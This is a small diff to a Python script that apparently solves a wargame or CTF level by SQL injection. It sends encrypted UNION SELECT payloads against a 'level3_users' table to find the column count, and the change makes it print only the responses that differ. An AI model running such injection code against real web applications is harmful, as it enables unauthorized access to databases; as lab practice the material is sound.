@@ -179,7 +179,7 @@ Column Length
     }
 
     n = 0
-    ret = ''
+    bef_ret = ''
     for l in range(20):
         params = {
             "usr": encrypt("' union select %s from level3_users-- " % str(n))
@@ -187,7 +187,11 @@ Column Length
         print "' union select %s from level3_users-- " % str(n)
         n = str(n) + "," + str(l+1)
         r = requests.post(url, cookies=cookies, params=params, verify=False)
-        print r.content
+        if bef_ret!=r.content and bef_ret!='':
+            print r.content
+
+        bef_ret = r.content
+
 
 
 
